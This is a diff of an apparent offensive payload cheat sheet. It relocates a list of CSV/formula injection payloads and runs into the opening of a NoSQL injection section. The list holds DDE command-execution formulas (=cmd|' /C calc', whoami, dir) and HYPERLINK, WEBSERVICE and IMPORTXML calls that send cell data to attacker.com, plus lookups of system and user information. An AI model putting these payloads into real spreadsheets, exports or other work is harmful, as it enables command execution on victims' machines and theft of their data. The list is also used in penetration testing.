@@ -3692,6 +3692,24 @@ DDE ("cmd";"/C calc";"!A0")A0
 =1+1;WEBSERVICE("http://attacker.com")
 =BASE64DECODE("PT1TVU0oMSwyKQ==")
 =CHAR(72)&CHAR(84)&CHAR(84)&CHAR(80)
+=1+1
+=2+2
+="test"
++1+1
+@1+1
+=cmd|' /C calc'!A0
+=cmd|' /C whoami'!A0
+=cmd|' /C dir'!A0
+=HYPERLINK("http://attacker.com/?data="&A1)
+=WEBSERVICE("http://attacker.com")
+=IMPORTXML("http://attacker.com","//data")
+=INFO("system")
+=USER()
+=CELL("filename")
+%3D1%2B1
+%3Dcmd%7C...
+\u003d1+1
+```
 ```
 
 ### Pop Notepad
@@ -3777,27 +3795,6 @@ Quote Prefix : `'=cmd|' /C calc'!A0` → Still executes in some cases
 Indirect Call :  `=INDIRECT("A1")` → Execute indirectly
 Nested Function :  `=HYPERLINK("http://evil.com","Click")`
 
-# 🔹 Brute Force CSV Payload List
-## ✅ Detection Payloads
-```
-=1+1
-=2+2
-="test"
-+1+1
-@1+1
-=cmd|' /C calc'!A0
-=cmd|' /C whoami'!A0
-=cmd|' /C dir'!A0
-=HYPERLINK("http://attacker.com/?data="&A1)
-=WEBSERVICE("http://attacker.com")
-=IMPORTXML("http://attacker.com","//data")
-=INFO("system")
-=USER()
-=CELL("filename")
-%3D1%2B1
-%3Dcmd%7C...
-\u003d1+1
-```
 # NoSQL Injection
 
 > NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
